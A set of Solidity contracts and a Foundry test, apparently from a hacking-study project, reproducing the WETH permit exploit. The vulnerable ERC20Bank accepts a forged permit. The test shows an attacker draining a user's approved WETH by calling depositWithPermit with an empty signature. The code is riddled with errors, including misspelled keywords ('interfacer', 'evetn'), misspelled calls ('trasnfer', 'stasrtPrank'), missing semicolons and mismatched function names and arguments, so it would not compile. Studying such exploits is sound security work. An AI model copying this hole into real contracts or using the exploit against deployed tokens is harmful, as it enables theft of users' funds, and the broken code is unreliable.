//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;


import "./IERC20Permit.sol";

contract ERC20Bank{
	
	IERC20Permit public immutable token;

	mapping(address => uint256) public balanceOf;

	constructor (address _token){
		token = IERC20Permit(_token);
	}

	function deposit (uint256 _amount) external {
		token.transferFrom(msg.sender, address(this), _amount);
		balanceOf[msg.sender] += _amount;
	}

	function depositWithPermit_(
		address owner,
		address recipient,
		uint256 amount,
		uint256 deadline,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external{

		token.permit(owner, address(this), amount ,deadline,v,r,s);
		token.transferFrom(owner,address(this), amount);
		balanceOf[recipient] += amount;
	}

	function withdraw(uint256 _amount) external {
		balanceOf[msg.sender] -= _amount;
		token.transferFrom(msg.sender, _amount);
	}



}


//SPDX-License-Identifier : MIT
pragma solidity ^ 0.8.24;

import {Test, Console2} from 'forge-std'Test.sol';
import {WETH} from "../../../src/hacks/wth-permit/WETH.sol";
import {ERC20Bank} from "../../../src/hacks/weth-permit/ERC20Banck.sol";

contract ERC20BankExploitTest is Test {
	
	WETH private weth;
	ERC20Bank private bank;
	address private constant user = address(11);
	address private constant attacker = address(12);

	function setUp() public {
		wet = WETH();
		bank = new ERC20Bank(address(weth));

		deal(user, 100 * 1e18);
		vm.startPrank(user);
		weth.deposit{value: 100 * 1e18}();
		weth.approve(address(bank), type(uint256).max);
		bank.deposit(1e18);
		vm.stopPrank();
	}

	function test() public {
		uint256 bal = weth.balanceOf(user);
		vm.stasrtPrank(attacker);
		bank.depositWithPermit(user, attacker, bal,0,0,"","");
		bank.withdraw(bal);
		vm.stopPrank();

		assertEq(weth.balanceOf(user),0,"WETH balance of user;")
		assertEq(weth.balanceOf(address(attacker)), 99 * 1e18, "WETH balance of attacker");
	}
}


//SPDX-License-Identifier: MIT
pragma solidity^0.8.24;


interfacer  IERC20 {
	
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transfer(address dst, uint256 amount) external returns(bool);
	function transferFrom(address src, address dst, uint256 amount) external returns(bool);

	event Transfer(address indexed src, address indexed dst, uint256 amount);
	event Approval(address indexed owner, address indexed spender, uint256 amount);

}


//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./IERC20.sol"

interfacer IERC20Permit {
	
	function permit (
		address owner,
		address spender,
		uint256 value,
		uint256 deadline,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external ;
}


//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract ERC20{
	event Transfer (address indexed from, address indexed to, uint256 amount);
	event Approval(address indexed owner, address indexed spender, uint256 amount);

	string public name;
	string public symbol;
	uint8 public immutable decimals;


	uint256 public totalSupply;
	mapping(address => uint256) public balanceOf;
	mapping(address => mapping(address => uint256)) public allowance;

	constructor (string memory _name, string memory _symbol, uint8 _decimals){
		name = _name;
		symbol = _symbol;
		decimals = _decimals;
	}


	function aprove(address spender, uint256 amount)
		public
		virtual
		returns (bool)
	{
		allowance[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address to, uint256 amount)
		public 
		virtual
		returns(bool)
	{
		balanceOf[msg.sender] -= amount;

		unchecked {
			balanceOf[to] += amount;
		}

		emit Transfer(msg.sender, amount);
		return true;
	}

	function transferFrom( address from, address to, uint256 amount)
		public
		virtual
		returns (bool)
	{
		uint256 allowed = allowance[from][msg.sender];
		if(allowed != type(uint256).max){
			allowance[from][msg.sender] = allowed -amount;
		}

		balanceOf[from] -= amount;
		unchecked{
			balanceOf[to] += amount;
		}
		emit Transfer(from, to, amount);
		return true;
	}

	function _mint(address to, uint256 amount) internal virtual {
		totalSupply += amount;

		unchecked {
			balanceOf[to] += amount;			
		}
		emit Transfer(address(0), to, amount);
	}

	function _burn( address from, uint256 amount) internal virtual {
		balanceOf[from] -= amount;
		unchecked{
			totalSupply -=  amount;
		}
		emit Transfer(from, address(0),amount);
	}
}


//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import './IERC20.sol'

contract WETH is ERC20{
	
	event Deposit(address indexed account, uint256 amount);
	evetn Withdraw(address indexed account, uint256 amount);

	constructor() ERC20("wrapped Ether","WETH", 18){}

	fallback() external payable{
		deposit();
	}

	function deposit() public payable{
		_mint(msg.sender, msg.value);
		emit Deposit(msg.sender, msg.value);
	}

	function withdraw(uint256 amount) external {
		_burn(msg.sender, amount);
		payable(msg.sender).trasnfer(amount);
		emit Withdraw(msg.sender, amount);
	}
}